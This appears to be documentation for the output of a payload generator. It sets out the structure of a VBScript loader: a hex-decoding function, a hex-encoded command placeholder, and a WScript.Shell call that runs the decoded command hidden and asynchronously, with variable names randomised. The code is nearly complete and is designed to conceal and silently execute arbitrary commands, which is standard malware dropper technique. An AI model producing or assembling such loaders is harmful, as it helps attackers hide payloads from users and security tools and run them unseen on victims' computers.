COMPLETE DECODER STRUCTURE
==========================

The generated VBS code has three main components:

1. DECODER FUNCTION
   Function DecodeHex<random>(h)
       Dim i, r
       For i = 1 To Len(h) Step 2
           r = r & Chr(CLng("&H" & Mid(h, i, 2)))
       Next
       DecodeHex<random> = r
   End Function

   Purpose: Convert hex string to plaintext
   Logic: Each 2-character hex pair -> ASCII character

2. DECODING EXECUTION
   Dim h_<random>
   h_<random> = "<hex_encoded_command>"
   Dim decoded_<random>
   decoded_<random> = DecodeHex<random>(h_<random>)

   Purpose: Declare, store, and decode hex payload
   Variables: h_* (hex), decoded_* (plaintext)

3. EXECUTION HANDLER (NEW)
   Dim shell_<random>
   Set shell_<random> = CreateObject("WScript.Shell")
   shell_<random>.Run decoded_<random>, 0, False
   Set shell_<random> = Nothing

   Purpose: Execute decoded command via WScript.Shell
   Variables: shell_* (COM object)
   Parameters: 0 = hidden, False = async
